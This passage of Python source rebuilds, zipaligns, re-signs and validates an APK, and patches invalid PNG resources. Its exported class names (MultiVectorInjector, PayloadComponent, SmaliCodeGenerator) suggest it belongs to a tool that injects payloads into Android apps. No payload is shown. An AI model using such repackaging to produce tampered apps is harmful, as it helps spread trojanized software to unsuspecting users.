    def _recompile_apk(self, extract_dir: Path, output_path: Path, sign_cfg: Optional[Dict[str, str]] = None) -> bool:
        """Recompile APK using apktool, then zipalign and sign (apksigner if enabled, else jarsigner)."""
        sign_cfg = sign_cfg or {}
        # Repair invalid PNGs that break aapt/aapt2
        try:
            self._fix_invalid_pngs(extract_dir)
        except Exception:
            pass
        # Build unsigned APK
        apktool_path = str(self.apktool_jar)
        ok, out = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "-o", str(output_path)], timeout=900)
        if (not ok or not output_path.exists()) and self.aapt2:
            # Retry with aapt2
            print("apktool build failed; retrying with --use-aapt2")
            ok2, out2 = self._run(["java", "-jar", apktool_path, "b", str(extract_dir), "--use-aapt2", "-o", str(output_path)], timeout=900)
            ok = ok2 and output_path.exists()
            out = out + "\n" + out2
        if not ok or not output_path.exists():
            self.last_error = f"apktool build failed:\n{out}".strip()
            print(f"Recompilation failed\n{out}")
            return False
        
        # Ensure keystore exists (debug by default)
        if not sign_cfg.get("keystore_path"):
            self._ensure_debug_keystore()
        
        # Zipalign before signing
        aligned = self._zipalign_apk(output_path)
        if aligned != output_path:
            try:
                # Replace original with aligned
                output_path.unlink(missing_ok=True)  # type: ignore
                aligned.rename(output_path)
            except Exception:
                pass
        
        # Select signing method
        signed_ok = False
        if self.enable_apksigner and self.apksigner:
            signed_ok = self._apksigner_sign(output_path, sign_cfg)
            if not signed_ok:
                self.last_error = (self.last_error + "\n" if self.last_error else "") + "apksigner signing failed"
                print("apksigner signing failed; attempting fallback jarsigner")
        if not signed_ok:
            # Fallback to jarsigner
            signed_ok = self._jarsigner_sign(output_path, sign_cfg)
            if signed_ok and self.apksigner:
                # If apksigner exists, still verify
                signed_ok = self._apksigner_verify(output_path) or signed_ok
        
        if not signed_ok:
            if not self.last_error:
                self.last_error = "signing failed"
            return False
        
        # Post-build validation (non-verbose)
        if not self._aapt_badging_ok(output_path):
            self.last_error = (self.last_error + "\n" if self.last_error else "") + "aapt/aapt2 badging failed"
            print("aapt/aapt2 badging failed")
            return False
        
        return True

    def _fix_invalid_pngs(self, extract_dir: Path) -> None:
        """Replace any res/**/*.png that is not a valid PNG signature with a tiny valid PNG placeholder.
        Keeps original as .orig for debugging.
        """
        png_sig = b"\x89PNG\r\n\x1a\n"
        # 1x1 transparent PNG
        tiny_png_b64 = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/woAAgMBgWn3mXQAAAAASUVORK5CYII="
        tiny_png = base64.b64decode(tiny_png_b64)
        res_dir = extract_dir / "res"
        if not res_dir.exists():
            return
        fixed = 0
        for p in res_dir.rglob("*.png"):
            try:
                # First: signature check
                with open(p, "rb") as f:
                    header = f.read(8)
                bad = header != png_sig
                # Second: decode verification via Pillow if available
                if not bad and _HAVE_PIL:
                    try:
                        with Image.open(p) as im:  # type: ignore
                            im.verify()
                    except Exception:
                        bad = True
                if bad:
                    # Backup original
                    try:
                        backup = p.with_suffix(p.suffix + ".orig")
                        if not backup.exists():
                            shutil.copy2(p, backup)
                    except Exception:
                        pass
                    with open(p, "wb") as f:
                        f.write(tiny_png)
                    fixed += 1
            except Exception:
                continue
        if fixed:
            print(f"Replaced {fixed} invalid PNGs with placeholders to satisfy aapt")

# Export main classes
__all__ = [
    'MultiVectorInjector', 'SmaliCodeGenerator', 'NativeLibraryGenerator',
    'InjectionPoint', 'PayloadComponent', 'InjectionStrategy'
]